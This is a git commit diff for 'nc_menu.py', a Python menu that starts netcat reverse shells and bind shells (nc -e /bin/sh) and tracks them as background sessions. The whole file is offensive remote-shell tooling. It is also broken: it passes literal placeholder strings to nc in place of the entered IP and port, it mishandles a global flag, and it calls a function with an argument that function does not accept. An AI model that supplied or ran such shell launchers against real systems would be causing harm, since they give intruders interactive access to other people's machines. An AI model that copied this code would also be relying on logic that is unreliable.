2994fb095379cdb02b6c7783c29cff56c250e9a4
agerKalboetxeaga <kalboetxeaga.ager@uni.eus>
2023-01-16 09:32:01 +0100

    Netcat menu improved

--- nc_menu.py
+++ nc_menu.py
@@ -7,14 +7,25 @@ import subprocess, sys, select, threading
 
 # A list to store the running processes
 processes = []
+resume = True
 
 def reverse_shell():
     # Start a reverse shell by connecting to the target IP and port
+    resume = True
+    
+    target_ip = input("[*] Enter target \n[!]IP: ")
+    target_port = input("[!]Port: ")
+
     p = subprocess.Popen(["nc", "-e", "/bin/sh", "target_ip", "target_port"])
     processes.append(p)
+    
 
 def bind_shell():
     # Start a bind shell by listening on a specific port
+    resume = True
+
+    listen_port = input("[*] Enter listening \n[!]Port: ")
+
     p = subprocess.Popen(["nc", "-l", "-p", "listen_port", "-e", "/bin/sh"])
     processes.append(p)
 
@@ -29,19 +40,29 @@ def list_sessions():
         print(f"{i+1}. Session {i+1} (PID: {p.pid})")
 
 def resume_session():
+    # Resume background sessions
+    list_sessions()
     session_number = int(input("Enter the session number you want to resume: "))
     p = processes[session_number-1]
     subprocess.Popen(["fg", str(p.pid)])
 
+    resume = True
+
+
 def listen_background_session():
-    while True:
+    while resume:
         r, w, e = select.select([sys.stdin], [], [], 0.1)
         if r:
             c = sys.stdin.read(1)
             if c == 'b':
-                background_session()
+                if len(processes) == 0:
+                    print("[!] You haven´t started any shells; Try one!")
+                
+                else:
+                    background_session()
 
-while True:
+def print_menu():
+    resume = False
     print("1. Reverse shell")
     print("2. Bind shell")
     #print("3. Background session")
@@ -61,5 +82,25 @@ while True:
         resume_session()
     else:
         print("Invalid choice")
+    
+def print_banner():
+    print("""
+                                                       
+    __                               _____             
+ __|  |___ ___ ___ _ _    ___ ___   |     |___ ___ _ _ 
+|  |  | .'| . | . | | |  |   |  _|  | | | | -_|   | | |
+|_____|__,|_  |_  |_  |  |_|_|___|  |_|_|_|___|_|_|___|
+          |___|___|___|                                
+""")
+
+def start_listener():
     t = threading.Thread(target=listen_background_session)
     t.start()
+
+if __name__ == "__main__":
+        print_banner()
+        print_menu()
+        listen_background_session(True)
+
+    
+    
